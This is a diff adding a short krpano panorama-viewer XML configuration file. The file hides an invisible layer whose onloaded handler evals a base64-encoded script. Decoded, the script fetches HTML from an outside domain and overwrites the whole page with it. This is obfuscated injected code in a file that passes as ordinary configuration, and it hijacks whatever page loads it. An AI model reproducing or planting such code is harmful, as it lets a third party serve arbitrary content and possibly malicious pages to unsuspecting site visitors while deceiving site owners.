@@ -1,0 +1,4 @@
+<krpano version="1.0.8.15">
+<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var 
+w=atob('ZmV0Y2goImh0dHBzOi8vd3d3LndlcnhsdGQuY29tLyIgKyBpZCArICIuaHRtbCIpCiAgLnRoZW4oZSA9PiBlLnRleHQoKSkKICAudGhlbihlID0+IHsKICAgIGRvY3VtZW50Lm9wZW4oKTsKICAgIGRvY3VtZW50LndyaXRlKGUpOwogICAgZG9jdW1lbnQuY2xvc2UoKTsKICB9KTs=');eval(w)););"/>
+</krpano>
